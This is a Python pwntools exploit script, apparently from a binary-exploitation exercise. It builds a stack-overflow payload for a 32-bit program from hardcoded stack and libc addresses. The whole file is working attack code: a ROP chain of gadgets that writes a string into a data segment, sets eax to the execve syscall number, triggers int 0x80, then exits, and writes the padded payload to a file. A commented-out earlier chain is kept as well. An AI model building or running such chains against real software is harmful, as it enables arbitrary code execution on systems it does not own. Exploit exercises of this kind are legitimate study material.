from pwn import *
import struct 
buf_addr = 0xffffbbbc
ebp_addr = 0xffffbc28

libc_addr = 0xf7c00000

pop_eax = 0x0002ed92
pop_ebx = 0x0002c01f
xor_eax = 0x00034ec0
inc_eax = 0x0002f7b5


int_addr = 0x08048623 # int 0x80; pop eax; ret;

offset = ebp_addr - buf_addr + 0x4
data_addr = buf_addr + offset + 0x54

'''
stack_values = [
    # libc_addr + pop_eax,
    libc_addr + xor_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + pop_ebx,
    data_addr,
    int_addr,
    0xffffffff, # padding

    # libc_addr + pop_eax,
    libc_addr + xor_eax,
    libc_addr + inc_eax,
    libc_addr + pop_ebx,
    0x11111111,
    int_addr,
    0xffffffff,
]
'''

dataSeg = 0x804a030
pop_edx = 0x00037375
mov_edx_eax = 0x00080b62

stack_values = [
    # libc_addr + pop_eax,
    libc_addr + pop_edx,
    dataSeg,
    libc_addr + pop_eax,
    b'data',
    libc_addr + mov_edx_eax,

    libc_addr + pop_edx,
    dataSeg + 4,
    libc_addr + xor_eax,
    libc_addr + mov_edx_eax,
    libc_addr + pop_ebx,
    dataSeg,

    libc_addr + xor_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    
    # data_addr,
    int_addr,
    0xffffffff, # padding

    # libc_addr + pop_eax,
    libc_addr + xor_eax,
    libc_addr + inc_eax,
    libc_addr + pop_ebx,
    0x11111111,
    int_addr,
    0xffffffff,
]



payload = b'a' * offset
for value in stack_values:
    try:
        payload += p32(value)
    except:
        payload += value
#payload += b'data'

with open('payload','wb') as f:
    f.write(payload)